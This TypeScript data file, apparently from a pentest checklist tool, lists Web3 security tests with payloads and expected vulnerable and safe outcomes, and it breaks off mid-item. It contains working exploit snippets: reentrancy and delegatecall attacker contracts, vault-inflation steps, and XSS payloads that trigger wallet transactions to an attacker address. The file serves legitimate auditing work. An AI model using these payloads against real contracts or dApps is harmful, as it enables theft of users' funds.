import type { ChecklistCategory } from "../types/checklist";

// Ordered: Smart Contract Vulns -> Access Control -> DeFi/Economic Logic
// -> Wallet & Signature Security -> Bridge/Cross-chain -> Frontend/dApp Integration

export const web3Categories: ChecklistCategory[] = [
  {
    id: "web3-contract",
    reference: "https://owasp.org/www-project-smart-contract-top-10/",
    name: "Smart Contract Vulnerabilities",
    emoji: "⛓️",
    items: [
      {
        id: "web3-contract-1",
        text: "Test for reentrancy in withdraw/transfer functions",
        how: "Check if external calls happen before state updates; deploy a malicious contract that re-enters the vulnerable function.",
        payloads: [
          "contract Attacker { Vault v; function attack() external payable { v.deposit{value: 1 ether}(); v.withdraw(); } receive() external payable { if (address(v).balance >= 1 ether) v.withdraw(); } }",
          "forge test --match-test testReentrancy -vvvv",
          "slither . --detect reentrancy-eth,reentrancy-no-eth",
        ],
        expectedResponse: {
          vulnerable: "The attack contract's fallback re-enters withdraw() before the balance is zeroed, draining more ether than the attacker actually deposited (balance goes negative/underflows or the vault empties).",
          safe: "State is updated before the external call (checks-effects-interactions) or a reentrancy guard causes the re-entrant call to revert with 'ReentrancyGuard: reentrant call'.",
        },
        severity: "critical",
      },
      {
        id: "web3-contract-2",
        text: "Test for integer overflow/underflow (pre-Solidity 0.8)",
        how: "Check arithmetic operations in contracts compiled before 0.8.0 that lack SafeMath.",
        payloads: [
          "// balances[msg.sender] -= amount; underflows to ~2^256 if amount > balance on pragma <0.8.0\ntoken.transfer(victim, 0); token.transferFrom(victim, attacker, type(uint256).max)",
          "slither . --detect integer-overflow",
          "myth analyze Contract.sol --solv 0.7.6 -m ArithmeticModule",
        ],
        expectedResponse: {
          vulnerable: "transferFrom with type(uint256).max wraps a subtraction below zero into a near-max balance, letting the attacker mint or transfer tokens they never owned.",
          safe: "The call reverts (Solidity 0.8+ built-in overflow checks or an explicit SafeMath require) instead of silently wrapping the arithmetic.",
        },
        severity: "high",
      },
      {
        id: "web3-contract-3",
        text: "Check access control on privileged functions",
        how: "Review onlyOwner/role-based modifiers for missing or bypassable access checks.",
        payloads: [
          "cast send $CONTRACT \"setAdmin(address)\" $ATTACKER --private-key $PK --rpc-url $RPC",
          "// look for tx.origin == owner instead of msg.sender == owner, or a modifier that's declared but never applied\ngrep -n 'onlyOwner\\|onlyRole\\|require(msg.sender' *.sol",
          "slither . --detect suicidal,arbitrary-send-erc20,unprotected-upgrade",
        ],
        expectedResponse: {
          vulnerable: "The setAdmin call from a non-owner account succeeds and $ATTACKER becomes admin, because the check uses tx.origin or an unapplied/missing modifier.",
          safe: "The transaction reverts with an ownership/role error (e.g. 'Ownable: caller is not the owner') for any caller besides the authorized address.",
        },
        severity: "critical",
      },
      {
        id: "web3-contract-4",
        text: "Test for unchecked external call return values",
        how: "Check if low-level calls (call/send) ignore the boolean return value, letting failed transfers go unnoticed.",
        payloads: [
          "// vulnerable: recipient.call{value: amount}(\"\"); with no check on the returned bool\nslither . --detect unchecked-lowlevel,unchecked-send,unchecked-transfer",
          "// PoC: deploy a contract with no receive()/fallback so the call silently fails while accounting still marks payout as sent",
        ],
        expectedResponse: {
          vulnerable: "The low-level call fails (recipient has no receive/fallback) but execution continues and internal accounting still marks the transfer as successful, desyncing real balances from recorded state.",
          safe: "The contract checks the returned bool (or uses a wrapper like OpenZeppelin's SafeERC20/Address.sendValue) and reverts the whole transaction when the call fails.",
        },
        severity: "high",
      },
      {
        id: "web3-contract-5",
        text: "Test for delegatecall to untrusted/user-controlled contracts",
        how: "Review delegatecall usage — if the target address is attacker-influenceable, it can execute arbitrary code in the caller's storage context.",
        payloads: [
          "contract Malicious { function() external { assembly { sstore(0, caller()) } } } // overwrites slot 0 (often owner) via delegatecall",
          "cast send $PROXY \"execute(address,bytes)\" $MALICIOUS_LIB $(cast calldata \"pwn()\") --private-key $PK",
          "slither . --detect controlled-delegatecall",
        ],
        expectedResponse: {
          vulnerable: "The malicious library's code executes in the caller's storage context, overwriting slot 0 (often the owner variable) and giving the attacker control of the proxy.",
          safe: "delegatecall targets are restricted to a fixed, audited implementation address (e.g. via an immutable or a whitelist), so an attacker-supplied address is rejected or has no storage-layout impact.",
        },
        severity: "critical",
      },
      {
        id: "web3-contract-6",
        text: "Test for uninitialized storage pointer bugs",
        how: "In older Solidity versions, check for uninitialized local storage struct/array variables that can corrupt contract state.",
        payloads: [
          "// e.g. `Voter storage v;` with no assignment aliases slot 0, letting a call overwrite owner/state\nslither . --detect uninitialized-storage,uninitialized-state",
          "myth analyze Contract.sol --solv 0.4.24",
        ],
        expectedResponse: {
          vulnerable: "An uninitialized storage struct/array pointer aliases slot 0, so a normal function call unexpectedly overwrites the owner or another critical state variable.",
          safe: "All local storage variables are explicitly assigned before use (or the compiler version/linter flags uninitialized storage pointers), so no slot-0 corruption occurs.",
        },
        severity: "critical",
      },
      {
        id: "web3-contract-7",
        text: "Test for front-running vulnerable functions",
        how: "Identify state-changing functions where a pending transaction's outcome can be predicted and exploited by an attacker submitting a higher-gas transaction first.",
        payloads: [
          "cast rpc eth_subscribe \"newPendingTransactions\" --ws $WS_RPC  # watch mempool for target function selector",
          "// simulate front-run: attacker copies calldata, resubmits with higher gasPrice/priorityFee before victim's tx mines",
          "flashbots-cli bundle --tx <frontrun_tx> --tx <victim_tx> --block latest",
        ],
        expectedResponse: {
          vulnerable: "The higher-gas front-run transaction mines first and captures the value (e.g. better price, claimed slot) that the victim's identical transaction intended to obtain.",
          safe: "The function uses commit-reveal, private mempool submission, or slippage/ordering-independent logic so a copied transaction submitted with higher gas provides the attacker no advantage.",
        },
        severity: "high",
      },
      {
        id: "web3-contract-8",
        text: "Test for denial-of-service via unbounded loops over user-controlled arrays",
        how: "Check for loops iterating over arrays that can be grown arbitrarily by users, eventually exceeding block gas limits.",
        payloads: [
          "for i in $(seq 1 5000); do cast send $CONTRACT \"register()\" --private-key $(cast wallet new | grep -o '0x[a-f0-9]*') --rpc-url $RPC; done  # grow the array",
          "forge test --match-test testUnboundedLoopDoS --gas-report",
        ],
        expectedResponse: {
          vulnerable: "Once the array grows large enough, any function iterating over it exceeds the block gas limit and reverts every time, permanently bricking that functionality.",
          safe: "The gas cost stays bounded regardless of array size (pagination, pull-based patterns, or a capped array length), so the function keeps succeeding as the array grows.",
        },
        severity: "medium",
      },
      {
        id: "web3-contract-9",
        text: "Test for self-destruct misuse / forced ether injection",
        how: "Check if contract logic incorrectly assumes it can't receive ether outside defined functions (selfdestruct can force-send ether to any address).",
        payloads: [
          "contract Forcer { function force(address payable target) external payable { selfdestruct(target); } }",
          "// PoC: fund Forcer, call force(victimContract) to corrupt a balance-based invariant like `require(address(this).balance == totalDeposits)`",
        ],
        expectedResponse: {
          vulnerable: "The forced ether desyncs address(this).balance from the contract's internal accounting variable, causing an invariant check like balance == totalDeposits to permanently fail or be exploitable.",
          safe: "Accounting logic never compares raw address(this).balance to internal counters for critical checks, so force-sent ether has no effect on contract behavior.",
        },
        severity: "medium",
      },
      {
        id: "web3-contract-10",
        text: "Test upgradeable proxy storage layout collisions",
        how: "For proxy-pattern upgradeable contracts, verify new implementation versions preserve storage slot ordering to avoid corrupting existing state.",
        payloads: [
          "forge inspect ImplementationV1 storage-layout --pretty",
          "forge inspect ImplementationV2 storage-layout --pretty  # diff against V1 for reordered/retyped slots",
          "cast storage $PROXY 0 --rpc-url $RPC  # read raw slot before/after upgrade",
        ],
        expectedResponse: {
          vulnerable: "The V2 storage-layout diff shows reordered, removed, or retyped variables, and reading a slot after upgrade returns a value that no longer matches the expected pre-upgrade variable (data corruption).",
          safe: "V2 only appends new variables after V1's existing layout (or uses namespaced/diamond storage), so every slot's value is unchanged and correctly interpreted after the upgrade.",
        },
        severity: "critical",
      },
      {
        id: "web3-contract-11",
        text: "Test for missing initializer protection on upgradeable contracts",
        how: "Check if the initialize() function can be called multiple times or by anyone after deployment, allowing re-initialization/takeover.",
        payloads: [
          "cast send $PROXY \"initialize(address)\" $ATTACKER --private-key $PK --rpc-url $RPC  # try calling on an already-deployed proxy",
          "cast call $IMPLEMENTATION \"owner()\" --rpc-url $RPC  # check if the logic contract itself was left uninitialized",
          "slither . --detect unprotected-upgrade,missing-initializer",
        ],
        expectedResponse: {
          vulnerable: "initialize(address) succeeds on an already-live proxy (or on the uninitialized logic contract), letting the attacker set themselves as owner and take over the contract.",
          safe: "The call reverts with 'Initializable: contract is already initialized' and the logic contract itself has its initializers disabled in its constructor.",
        },
        severity: "critical",
      },
      {
        id: "web3-contract-12",
        text: "Test timestamp/blockhash dependence for randomness manipulation",
        how: "Check if contract logic uses block.timestamp or blockhash as a source of randomness, which miners can influence.",
        payloads: [
          "grep -n 'block.timestamp\\|blockhash\\|block.difficulty\\|block.prevrandao' *.sol",
          "// Foundry cheatcode PoC: vm.warp(block.timestamp + 1); to show outcome shifts with attacker-controlled timestamp",
          "slither . --detect weak-prng",
        ],
        expectedResponse: {
          vulnerable: "Warping block.timestamp (or a chosen blockhash) changes the outcome of the 'random' logic in the attacker's favor, e.g. always winning a lottery or bypassing a time-lock check.",
          safe: "Randomness is sourced from a verifiable off-chain oracle (Chainlink VRF) or a commit-reveal scheme, so manipulating the timestamp/blockhash has no effect on the outcome.",
        },
        severity: "medium",
      },
    ],
  },
  {
    id: "web3-access",
    reference: "https://owasp.org/www-project-smart-contract-top-10/",
    name: "Access Control & Governance",
    emoji: "🗝️",
    items: [
      {
        id: "web3-access-1",
        text: "Test multisig/timelock bypass on critical admin functions",
        how: "Verify sensitive functions (upgrade, mint, pause) genuinely require the full multisig/timelock flow and can't be triggered directly.",
        payloads: [
          "cast call $TIMELOCK \"getMinDelay()\" --rpc-url $RPC  # check delay isn't 0",
          "cast send $CONTRACT \"mint(address,uint256)\" $ATTACKER 1000000 --private-key $PK --rpc-url $RPC  # try calling directly, bypassing timelock",
          "cast call $MULTISIG \"getThreshold()\" --rpc-url $RPC && cast call $MULTISIG \"getOwners()\" --rpc-url $RPC",
        ],
        expectedResponse: {
          vulnerable: "The direct mint() call succeeds from a single EOA/PK without going through the timelock or multisig, or getMinDelay() returns 0, meaning the safeguard is decorative.",
          safe: "The direct call reverts because only the timelock/governor address is authorized, and getMinDelay() enforces a non-zero delay before execution.",
        },
        severity: "critical",
      },
      {
        id: "web3-access-2",
        text: "Test for governance proposal execution without proper voting",
        how: "Check if a malicious or insufficiently-supported proposal can still be executed due to a flaw in vote counting/quorum logic.",
        payloads: [
          "cast call $GOVERNOR \"quorum(uint256)\" $BLOCK --rpc-url $RPC",
          "cast call $GOVERNOR \"proposalVotes(uint256)\" $PROPOSAL_ID --rpc-url $RPC  # compare for/against/abstain vs quorum requirement",
          "cast send $GOVERNOR \"execute(uint256)\" $PROPOSAL_ID --private-key $PK --rpc-url $RPC  # attempt execute before/without quorum reached",
        ],
        expectedResponse: {
          vulnerable: "execute() succeeds even though proposalVotes shows for-votes below the quorum() requirement, letting an under-supported proposal take effect.",
          safe: "execute() reverts with a quorum-not-reached error whenever for-votes are below the computed quorum threshold.",
        },
        severity: "critical",
      },
      {
        id: "web3-access-3",
        text: "Test flash-loan-based governance vote manipulation",
        how: "Check if voting power is based on a snapshot-able token balance that could be flash-loaned to temporarily swing a vote.",
        payloads: [
          "// Aave-style flashloan governance attack pseudocode:\nfunction executeOperation(...) external { govToken.flashBorrow(HUGE_AMOUNT); governor.castVote(propId, FOR); govToken.repay(HUGE_AMOUNT); }",
          "cast call $GOVERNOR \"getVotes(address,uint256)\" $ATTACKER $SNAPSHOT_BLOCK --rpc-url $RPC  # confirm balance at vote-start block, not real-time, is used",
        ],
        expectedResponse: {
          vulnerable: "getVotes reflects real-time/borrowed balance rather than a fixed snapshot block, so a flash-loaned balance held only for one transaction is enough to cast a decisive vote.",
          safe: "getVotes always returns the balance checkpointed at the proposal's snapshot block, so a same-transaction flash loan (acquired after the snapshot) grants zero voting power.",
        },
        severity: "critical",
      },
      {
        id: "web3-access-4",
        text: "Test for role renouncement / ownership transfer edge cases",
        how: "Check if renouncing ownership or transferring to an invalid address (0x0) can permanently brick admin functionality unintentionally.",
        payloads: [
          "cast send $CONTRACT \"transferOwnership(address)\" 0x0000000000000000000000000000000000000000 --private-key $PK --rpc-url $RPC",
          "cast send $CONTRACT \"renounceOwnership()\" --private-key $PK --rpc-url $RPC",
        ],
        expectedResponse: {
          vulnerable: "Ownership transfers to the zero address or is renounced without a guard, permanently locking out any admin-only recovery/upgrade/pause function forever.",
          safe: "transferOwnership rejects address(0) and renounceOwnership either is disabled or is a deliberate, reversible two-step process with a clear warning.",
        },
        severity: "medium",
      },
      {
        id: "web3-access-5",
        text: "Test pausable contract mechanisms for bypass",
        how: "If the contract has an emergency pause feature, confirm all critical fund-moving functions actually respect the paused state.",
        payloads: [
          "cast send $CONTRACT \"pause()\" --private-key $ADMIN_PK --rpc-url $RPC",
          "cast send $CONTRACT \"withdraw(uint256)\" 1000000000000000000 --private-key $PK --rpc-url $RPC  # should revert with 'Pausable: paused' — check every fund path",
          "grep -n 'whenNotPaused' *.sol  # confirm modifier is applied to withdraw/transfer/redeem, not just mint/deposit",
        ],
        expectedResponse: {
          vulnerable: "withdraw() still succeeds while the contract is paused because the whenNotPaused modifier was only applied to deposit/mint, not to the fund-moving path.",
          safe: "Every fund-moving function reverts with 'Pausable: paused' once pause() has been called, with no path left unguarded.",
        },
        severity: "high",
      },
    ],
  },
  {
    id: "web3-defi",
    reference: "https://owasp.org/www-project-smart-contract-top-10/",
    name: "DeFi & Economic Logic",
    emoji: "💰",
    items: [
      {
        id: "web3-defi-1",
        text: "Test for price oracle manipulation",
        how: "Check if the protocol relies on a manipulable on-chain price source (e.g. spot price from a low-liquidity pool) for critical calculations.",
        payloads: [
          "cast call $PAIR \"getReserves()\" --rpc-url $RPC  # check pool depth used for pricing",
          "// PoC: swap a large amount to skew reserves, then call the vulnerable function that reads getAmountOut/spot price in the same tx, then swap back",
          "grep -n 'getReserves\\|latestAnswer\\|TWAP\\|observe(' *.sol  # spot price vs Chainlink/TWAP",
        ],
        expectedResponse: {
          vulnerable: "Skewing the low-liquidity pool's reserves in the same transaction moves the spot price used for collateral/liquidation/pricing math, letting the attacker profit or trigger an unfair liquidation before swapping back.",
          safe: "Pricing relies on a Chainlink feed or a time-weighted average (TWAP) that a single-transaction reserve swing cannot meaningfully move.",
        },
        severity: "critical",
      },
      {
        id: "web3-defi-2",
        text: "Test for flash loan attack vectors",
        how: "Model whether a flash-loaned large balance can manipulate collateral/voting/price logic within a single transaction.",
        payloads: [
          "// Aave V3 flashLoan pseudocode\nPOOL.flashLoanSimple(address(this), USDC, 10_000_000e6, data, 0);\nfunction executeOperation(...) external { /* manipulate price/collateral, exploit target, repay */ }",
          "forge test --match-test testFlashLoanExploit --fork-url $MAINNET_RPC -vvvv",
        ],
        expectedResponse: {
          vulnerable: "The forge test shows the flash-borrowed balance temporarily satisfies a collateral/voting/price check within the same transaction, letting the attacker extract value before repaying the loan.",
          safe: "The protocol's checks are invariant to same-block balance changes (snapshotted balances, time-weighted checks, or per-block borrow caps), so the flash loan yields no exploitable state change.",
        },
        severity: "critical",
      },
      {
        id: "web3-defi-3",
        text: "Test for slippage/sandwich attack exposure",
        how: "Check if swap functions lack a user-settable minimum-output parameter, allowing an attacker to sandwich the transaction for profit.",
        payloads: [
          "grep -n 'amountOutMin\\|minAmountOut\\|slippage' *.sol  # missing/hardcoded to 0 is the smell",
          "// sandwich sim: front-run buy to raise price -> victim swap executes at worse rate -> back-run sell for profit",
          "cast call $ROUTER \"getAmountsOut(uint256,address[])\" 1000000000000000000 \"[$TOKEN_IN,$TOKEN_OUT]\" --rpc-url $RPC",
        ],
        expectedResponse: {
          vulnerable: "amountOutMin is missing or hardcoded to 0, so the swap executes at whatever price exists at mine time, letting a sandwich attacker extract the difference.",
          safe: "The function requires a caller-supplied minimum-output parameter and reverts with 'INSUFFICIENT_OUTPUT_AMOUNT' if the sandwiched price would violate it.",
        },
        severity: "medium",
      },
      {
        id: "web3-defi-4",
        text: "Test rounding errors in share/liquidity calculations",
        how: "Check deposit/withdraw math for rounding-direction bugs that let a user extract slightly more value than deposited, repeatable at scale.",
        payloads: [
          "// shares = (amount * totalSupply) / totalAssets — check rounding direction favors protocol on deposit and user on withdraw\nforge test --match-test testRoundingExploitLoop -vvvv",
          "for i in $(seq 1 1000); do cast send $VAULT \"deposit(uint256)\" 1 --private-key $PK --rpc-url $RPC; cast send $VAULT \"withdraw(uint256)\" 1 --private-key $PK --rpc-url $RPC; done",
        ],
        expectedResponse: {
          vulnerable: "Repeating the tiny deposit/withdraw loop steadily increases the attacker's extracted assets beyond what was deposited, because rounding always favors the user instead of the protocol.",
          safe: "Share math consistently rounds in the protocol's favor (down on deposit, down on withdraw), so the loop yields no net gain and may even show a small loss to the attacker.",
        },
        severity: "high",
      },
      {
        id: "web3-defi-5",
        text: "Test for first-depositor / vault inflation attack",
        how: "Check ERC-4626-style vaults for the classic first-depositor share-price manipulation attack via a direct token donation.",
        payloads: [
          "// classic ERC-4626 inflation attack:\nvault.deposit(1, attacker); // mints 1 share\nasset.transfer(address(vault), 10000e18); // donate directly, inflating price-per-share\n// victim's deposit(10000e18) now rounds down to 0 shares",
          "forge test --match-test testERC4626InflationAttack -vvvv",
        ],
        expectedResponse: {
          vulnerable: "After the donation, the victim's deposit computes to 0 shares due to rounding, so their assets are absorbed into the vault and effectively stolen by the first depositor.",
          safe: "The vault uses virtual shares/assets (an internal offset) or requires a minimum first deposit burned to a dead address, so donating tokens directly cannot manipulate the price-per-share enough to zero out a legitimate deposit.",
        },
        severity: "critical",
      },
      {
        id: "web3-defi-6",
        text: "Test liquidation logic for manipulation or unfair execution",
        how: "Check if liquidation thresholds/rewards can be gamed by manipulating the price feed or by self-liquidating for profit.",
        payloads: [
          "cast call $LENDING_POOL \"getUserAccountData(address)\" $VICTIM --rpc-url $RPC  # check health factor",
          "cast send $LENDING_POOL \"liquidationCall(address,address,address,uint256,bool)\" $COLLATERAL $DEBT $VICTIM $DEBT_AMOUNT false --private-key $PK --rpc-url $RPC",
          "// self-liquidation PoC: open position near threshold, manipulate oracle down, liquidate own position for bonus",
        ],
        expectedResponse: {
          vulnerable: "The attacker manipulates the oracle price down just enough to cross the health-factor threshold, then liquidates their own position and pockets the liquidation bonus at no real risk.",
          safe: "Liquidation uses a manipulation-resistant price source and the health factor cannot be crossed by a transient price move, so self-liquidation yields no bonus beyond genuine insolvency.",
        },
        severity: "high",
      },
      {
        id: "web3-defi-7",
        text: "Test fee-on-transfer / rebasing token compatibility assumptions",
        how: "Check if the protocol assumes a fixed transferred amount, breaking accounting when interacting with fee-on-transfer or rebasing tokens.",
        payloads: [
          "// PoC: balanceBefore = token.balanceOf(address(this)); token.transferFrom(user, address(this), amount); actualReceived = token.balanceOf(address(this)) - balanceBefore; assert(actualReceived == amount); // fails for fee-on-transfer tokens",
          "forge test --match-test testFeeOnTransferAccounting -vvvv",
        ],
        expectedResponse: {
          vulnerable: "actualReceived is less than the requested amount for a fee-on-transfer/rebasing token, but the contract credits the user for the full nominal amount, creating an accounting shortfall that later withdrawals can exploit.",
          safe: "The contract measures balanceOf before and after the transfer and credits only the actual amount received, matching real token movement for fee-on-transfer and rebasing tokens.",
        },
        severity: "high",
      },
    ],
  },
  {
    id: "web3-wallet",
    reference: "https://owasp.org/www-project-smart-contract-top-10/",
    name: "Wallet & Signature Security",
    emoji: "✍️",
    items: [
      {
        id: "web3-wallet-1",
        text: "Test for signature replay across chains/contracts",
        how: "Check if a signed message lacks chain ID / contract address / nonce binding, allowing replay elsewhere.",
        payloads: [
          "cast wallet sign --private-key $PK $(cast keccak \"transfer(address,uint256)\")  # inspect what's actually hashed/signed",
          "// replay PoC: capture (v,r,s) from chain A tx, resubmit identical calldata to same contract address deployed on chain B\ncast send $CONTRACT_CHAIN_B \"executeWithSig(bytes,uint8,bytes32,bytes32)\" $DATA $V $R $S --rpc-url $RPC_CHAIN_B",
        ],
        expectedResponse: {
          vulnerable: "The same signature captured on chain A is accepted verbatim by the identically-deployed contract on chain B, executing an action the signer never authorized on that chain.",
          safe: "The signed hash includes block.chainid and address(this), so replaying it on another chain or contract produces a hash mismatch and the signature check fails.",
        },
        severity: "high",
      },
      {
        id: "web3-wallet-2",
        text: "Test for signature malleability",
        how: "Check if the contract validates signatures in a way vulnerable to ECDSA malleability, allowing a valid signature to be altered while still verifying.",
        payloads: [
          "// malleability: (v, r, s) and (v', r, n - s) both verify for the same message — check contract uses OpenZeppelin ECDSA.sol (rejects high-s) not raw ecrecover\ngrep -n 'ecrecover' *.sol",
          "python3 -c \"from ecdsa.util import sigdecode_string; n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141; s2 = n - s; print(hex(s2))\"",
        ],
        expectedResponse: {
          vulnerable: "The derived (v, n-s) signature also passes ecrecover for the same message, letting an attacker mint a second valid signature hash that can bypass a used-signature/nonce check keyed on the signature itself.",
          safe: "The contract uses OpenZeppelin's ECDSA.sol (or an equivalent low-s check), rejecting any signature with s above the curve's half-order, so the malleable variant reverts.",
        },
        severity: "medium",
      },
      {
        id: "web3-wallet-3",
        text: "Test EIP-712 typed data signing for phishing-resistant clarity",
        how: "Check if signature requests use readable EIP-712 structured data rather than opaque hashes a user could be tricked into signing.",
        payloads: [
          "// check wallet prompt: eth_sign / personal_sign on a raw hash shows unreadable hex, eth_signTypedData_v4 shows a structured, reviewable form\nweb3.eth.signTypedData(account, { domain, types, primaryType, message })",
          "cast wallet sign --data '{\"types\":{...},\"domain\":{...},\"message\":{...}}'  # confirm domain separator includes chainId + verifyingContract",
        ],
        expectedResponse: {
          vulnerable: "The wallet prompt shows only an opaque hex hash (eth_sign/personal_sign on a raw hash) with no readable fields, making it easy to trick a user into signing an unintended action.",
          safe: "The wallet renders a structured EIP-712 prompt showing domain, types, and message fields in plain readable form, with the domain separator bound to chainId and verifyingContract.",
        },
        severity: "medium",
      },
      {
        id: "web3-wallet-4",
        text: "Test permit()/gasless approval signature scoping",
        how: "Check if an ERC-2612 permit signature can be front-run or replayed to grant unintended token approvals.",
        payloads: [
          "cast call $TOKEN \"nonces(address)\" $OWNER --rpc-url $RPC  # confirm nonce increments and is checked",
          "// front-run PoC: observe victim's permit(owner, spender, value, deadline, v, r, s) in mempool, submit it yourself first with a manipulated spender-controlled follow-up tx\ncast send $TOKEN \"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)\" $OWNER $SPENDER $VALUE $DEADLINE $V $R $S --rpc-url $RPC",
        ],
        expectedResponse: {
          vulnerable: "The permit signature can be resubmitted by anyone (front-run) to grant the approval before the victim's own transaction, or nonces() doesn't increment/get checked, letting the same signature be replayed.",
          safe: "nonces(owner) increments after each successful permit and is validated on-chain, so submitting the front-run copy still grants the approval harmlessly (idempotent) and any later replay attempt reverts with an invalid-nonce/signature error.",
        },
        severity: "high",
      },
      {
        id: "web3-wallet-5",
        text: "Test for unlimited token approval risk in integration flows",
        how: "Check if the dApp requests unlimited (max uint256) token approvals by default instead of the exact amount needed.",
        payloads: [
          "// inspect the approve() call the dApp constructs in devtools/network tab\ntoken.approve(spender, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')",
          "cast call $TOKEN \"allowance(address,address)\" $USER $SPENDER --rpc-url $RPC",
          "revoke.cash  # cross-check whether the app's granted allowances show as unlimited",
        ],
        expectedResponse: {
          vulnerable: "The devtools network/calldata shows approve() called with type(uint256).max, and revoke.cash confirms the granted allowance is unlimited, exposing the user's full token balance to any future spender-contract bug.",
          safe: "The dApp requests approval scoped to the exact amount needed for the current transaction, and allowance(user, spender) reflects that bounded value rather than max uint256.",
        },
        severity: "medium",
      },
    ],
  },
  {
    id: "web3-bridge",
    reference: "https://owasp.org/www-project-smart-contract-top-10/",
    name: "Bridge & Cross-Chain Security",
    emoji: "🌉",
    items: [
      {
        id: "web3-bridge-1",
        text: "Test bridge message validation for spoofed source chain",
        how: "Check if the destination-chain contract properly verifies the message actually originated from the expected source chain/bridge relayer.",
        payloads: [
          "cast send $BRIDGE_DEST \"receiveMessage(bytes,bytes)\" $FORGED_MESSAGE $FORGED_PROOF --private-key $PK --rpc-url $RPC_DEST  # try spoofing sourceChainId/sender fields",
          "grep -n 'sourceChainId\\|trustedRemote\\|require(msg.sender == relayer' *.sol",
        ],
        expectedResponse: {
          vulnerable: "The forged message with a spoofed sourceChainId/sender is accepted and processed, minting or releasing funds based on an origin that was never validated.",
          safe: "The call reverts because the destination contract checks the message against a trusted-remote/relayer allowlist and rejects any unrecognized source chain or sender.",
        },
        severity: "critical",
      },
      {
        id: "web3-bridge-2",
        text: "Test for double-spend via bridge replay",
        how: "Check if a bridge withdrawal proof/message can be replayed to mint/release funds more than once.",
        payloads: [
          "cast call $BRIDGE \"processedNonces(bytes32)\" $MESSAGE_HASH --rpc-url $RPC  # confirm a nonce/hash is marked used before payout",
          "cast send $BRIDGE \"claim(bytes,bytes)\" $SAME_MESSAGE $SAME_PROOF --private-key $PK --rpc-url $RPC  # resubmit an already-claimed message",
        ],
        expectedResponse: {
          vulnerable: "The second claim() call with the identical message/proof succeeds and pays out again, because processedNonces was never marked or checked before disbursing funds.",
          safe: "The replayed claim reverts with an 'already processed'/nonce-used error, since the message hash was marked spent before the first payout completed.",
        },
        severity: "critical",
      },
      {
        id: "web3-bridge-3",
        text: "Test relayer/validator set compromise impact",
        how: "Assess what a minority or majority compromise of the bridge's off-chain validator set would allow an attacker to do.",
        payloads: [
          "cast call $BRIDGE \"requiredSignatures()\" --rpc-url $RPC && cast call $BRIDGE \"validatorCount()\" --rpc-url $RPC  # check the m-of-n threshold",
          "// model: if threshold is e.g. 4-of-7, assess whether 4 validator keys are realistically obtainable (shared infra, same cloud account, leaked keys)",
        ],
        expectedResponse: {
          vulnerable: "The threshold is low relative to validator count (or validators share infrastructure/cloud accounts), so compromising a small, realistically-obtainable subset of keys is enough to forge messages and mint/release funds arbitrarily.",
          safe: "The threshold requires a large, diverse, independently-operated majority of validators, making collusion or key compromise at that scale impractical.",
        },
        severity: "high",
      },
      {
        id: "web3-bridge-4",
        text: "Test locked-vs-minted supply consistency across chains",
        how: "Verify the total minted wrapped-token supply never exceeds what's actually locked on the source chain, even under edge-case failure paths.",
        payloads: [
          "cast call $WRAPPED_TOKEN \"totalSupply()\" --rpc-url $RPC_DEST",
          "cast call $LOCK_CONTRACT \"totalLocked()\" --rpc-url $RPC_SOURCE  # compare against wrapped totalSupply — should always be >=",
          "// stress edge cases: partial-fill deposits, reorg on source chain, and relayer double-processing during a failed/retried tx",
        ],
        expectedResponse: {
          vulnerable: "Under a reorg or a retried/double-processed relay, totalSupply() on the destination chain exceeds totalLocked() on the source chain, meaning wrapped tokens exist without backing collateral.",
          safe: "Even under reorgs and retried transactions, minted wrapped supply never exceeds locked collateral because deposits are idempotent and confirmed only after sufficient source-chain finality.",
        },
        severity: "critical",
      },
    ],
  },
  {
    id: "web3-frontend",
    reference: "https://owasp.org/www-project-smart-contract-top-10/",
    name: "dApp Frontend & Integration Security",
    emoji: "🖥️",
    items: [
      {
        id: "web3-frontend-1",
        text: "Test dApp frontend for malicious contract address injection",
        how: "Check if contract addresses used by the frontend are hardcoded/verified rather than fetched from a source that could be tampered with (CDN, DNS).",
        payloads: [
          "curl -s https://app.example.com/config.json | jq '.contractAddress'  # remotely-fetched config is a supply-chain risk",
          "// diff bundled JS contract addresses against etherscan-verified official addresses\ncurl -s https://app.example.com/static/js/main.js | grep -oE '0x[a-fA-F0-9]{40}'",
        ],
        expectedResponse: {
          vulnerable: "config.json or the bundled JS is fetched from a mutable CDN/DNS-dependent source, and the contract address in it differs from the official Etherscan-verified address, meaning a compromised CDN could redirect user funds to an attacker contract.",
          safe: "Contract addresses are hardcoded/immutable in the shipped bundle (or pinned via subresource integrity) and match the official verified addresses exactly, so a CDN/DNS compromise can't silently swap the target contract.",
        },
        severity: "critical",
      },
      {
        id: "web3-frontend-2",
        text: "Test wallet-connect flow for phishing/approval trickery",
        how: "Review transaction confirmation UI for clarity — check if a malicious dApp could disguise a token-drain approval as a benign action.",
        payloads: [
          "// malicious dApp calls setApprovalForAll(attacker, true) on an NFT contract while UI shows a fake 'Claim Airdrop' button\nnft.setApprovalForAll(attacker, true)",
          "// or requests Permit2/permit() signature disguised as a 'connect wallet' or 'verify ownership' prompt",
        ],
        expectedResponse: {
          vulnerable: "The wallet confirmation UI shows generic/truncated text so a setApprovalForAll or permit signature request is indistinguishable from a benign 'connect' or 'claim' action, letting users unknowingly grant a full drain approval.",
          safe: "The transaction/signature prompt clearly labels the specific method and its scope (e.g. 'Approve all NFTs to 0x...') so a disguised drain approval is visibly flagged before signing.",
        },
        severity: "high",
      },
      {
        id: "web3-frontend-3",
        text: "Test for XSS in dApp frontend leading to wallet interaction hijack",
        how: "Standard XSS testing on the dApp's web frontend, but with elevated impact since it could trigger malicious wallet transaction prompts.",
        payloads: [
          "<script>window.ethereum.request({method:'eth_sendTransaction',params:[{to:'0xATTACKER',value:'0xDE0B6B3A7640000',data:'0x'}]})</script>",
          "\"><img src=x onerror=\"window.ethereum.request({method:'wallet_requestPermissions',params:[{eth_accounts:{}}]})\">",
        ],
        expectedResponse: {
          vulnerable: "The injected script executes and successfully triggers an unsolicited eth_sendTransaction/wallet_requestPermissions prompt in the victim's wallet, confirming stored/reflected XSS can hijack wallet interactions.",
          safe: "The payload is rendered as inert text/HTML-escaped and no wallet_request/eth_sendTransaction call fires, because input is sanitized/output-encoded and CSP blocks inline script execution.",
        },
        severity: "critical",
        tags: { tech: ["web"] },
      },
      {
        id: "web3-frontend-4",
        text: "Test RPC endpoint trust and man-in-the-middle resilience",
